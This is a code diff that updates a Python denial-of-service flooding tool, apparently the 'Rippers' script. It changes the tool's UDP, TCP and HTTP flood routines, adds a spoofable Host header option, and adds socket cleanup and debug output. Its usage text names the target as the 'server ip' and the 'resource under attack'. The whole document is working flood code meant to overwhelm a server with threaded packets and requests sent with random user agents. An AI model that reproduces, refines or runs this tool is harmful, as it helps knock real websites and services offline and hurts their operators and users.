@@ -54,9 +54,9 @@ def down_it_udp():
         else:
             extra_data = ''
         packet = str(
-            "GET / HTTP/1.1\nHost: " + host
-            + "\n\n User-Agent: "
-            + random.choice(uagent)
+            "GET / HTTP/1.1"
+            + "\nHost: " + host_name
+            + "\nUser-Agent: " + random.choice(uagent)
             + "\n" + data
             + "\n\n" + extra_data).encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -64,14 +64,20 @@ def down_it_udp():
         p = int(port) if port else get_random_port()
         try:
             s.sendto(packet, (host, p))
+            time.sleep(.05)
+            try:
+                s.close()
+            except:
+                print("\033[91m Socket close failed.\033[0m")
         except socket.gaierror:
-            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
-        except Exception as e:
+            print("\033[91m Can't get server IP. Packet sending failed. Check your VPN.\033[0m")
+        except BaseException as e:
             if error_debug:
-                print("\033[91mError: " + str(e) + ".\033[0m")
-            print("\033[91mPacket sending failed. Check your VPN.\033[0m")
+                print("\033[91m Error: " + str(e) + ".\033[0m")
+            print("\033[91m Packet sending failed. Check your VPN.\033[0m")
         else:
             print('\033[92m Packet was sent \033[0;0m')
+            time.sleep(.05)
 
         if port:
             i += 1
@@ -80,7 +86,6 @@ def down_it_udp():
                 thread = threading.Thread(target=connect_host)
                 thread.daemon = True
                 thread.start()
-        time.sleep(.05)
 
 
 def down_it_http():
@@ -99,14 +104,21 @@ def down_it_http():
 
         try:
             context = ssl._create_unverified_context()
-            urllib.request.urlopen(
+            r = urllib.request.urlopen(
                 urllib.request.Request(url, headers=http_headers),
                 context=context
             )
-        except Exception as e:
+            try:
+                if error_debug:
+                    print('\033[92m ' + str(r.status) + ' \033[0;0m')
+                    print('\033[92m ' + str(r.headers) + ' \033[0;0m')
+                r.close()
+            except:
+                print("\033[91m Request close failed.\033[0m")
+        except BaseException as e:
             if error_debug:
-                print("\033[91mError: " + str(e) + ".\033[0m")
-            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
+                print("\033[91m Error: " + str(e) + ".\033[0m")
+            print("\033[91m No connection with server. It could be a reason of current attack or bad VPN connection."
                   " Program will continue working.\033[0m")
         else:
             print('\033[92m HTTP-Request was done \033[0;0m')
@@ -118,20 +130,25 @@ def down_it_tcp():
     while True:
         try:
             packet = str(
-                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
-                'utf-8')
+                "GET " + resource + " HTTP/1.1"
+                + "\nHost: " + host_name
+                + "\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 print('\033[92m TCP Packet was sent \033[0;0m')
             else:
-                print("\033[91mshut<->down\033[0m")
+                print("\033[91m shut<->down \033[0m")
             time.sleep(.05)
-        except Exception as e:
+            try:
+                s.close()
+            except:
+                print("\033[91m Socket close failed.\033[0m")
+        except BaseException as e:
             if error_debug:
-                print("\033[91mError: " + str(e) + ".\033[0m")
-            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
+                print("\033[91m Error: " + str(e) + ".\033[0m")
+            print("\033[91m No connection with server. It could be a reason of current attack or bad VPN connection."
                   " Program will continue working.\033[0m")
             time.sleep(.05)
 
@@ -148,6 +165,7 @@ def usage():
 	-t : -threads default 100
 	-m : -method default udp (udp/tcp/http)
 	-d : -debug debug error messages
+	--host : host to provide in packet
     --resource : -api-host under attack\033[0m ''')
     sys.exit()
 
@@ -162,6 +180,7 @@ def get_parameters():
     global resource
     global error_debug
     global headers_dict
+    global host_name
     optp = OptionParser(add_help_option=False, epilog="Rippers")
     optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
     optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
@@ -174,6 +193,7 @@ def get_parameters():
     optp.add_option("-m", "--method", type="str", dest="attack_method",
                     help="Attack method: udp (default), tcp, http")
     optp.add_option('--resource', type='str', dest='resource', help='It shows the resource under attack.', default="/")
+    optp.add_option('--host', type='str', dest='host_name', help='Host name to provide in packet.', default="")
     opts, args = optp.parse_args()
     if opts.help:
         usage()
@@ -208,6 +228,9 @@ def get_parameters():
 
     if opts.resource is not None:
         resource = opts.resource
+
+    if len(opts.host_name) > 0:
+        host_name = opts.host_name
 
 
 def check_host():
